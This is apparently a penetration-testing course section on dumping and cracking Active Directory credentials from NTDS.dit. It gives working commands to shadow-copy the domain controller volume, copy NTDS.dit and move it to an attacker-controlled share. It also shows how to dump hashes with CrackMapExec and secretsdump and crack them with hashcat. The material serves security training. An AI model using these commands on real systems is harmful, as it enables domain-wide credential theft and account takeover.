# Dump NTDS.dit
In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.

Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.

Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique.


## Capturing NTDS.dit
NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's Attacking SAM section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.

### Checking User Account Privileges including Domain
- `net user bwilliamson`

### Creating Shadow Copy of C:
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.

- `vssadmin CREATE SHADOW /For=C:`

### Copying NTDS.dit from the VSS
We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`

### Transferring NTDS.dit to Attack Host
Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.
- `cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData`

### CrackMapExec
Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
```
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Impacket
```
$ secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<IP> 
```

## Cracking Hashes & Gaining Credentials
We can proceed with creating a text file containing all the NT hashes, or we can individually copy & paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.

- `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`
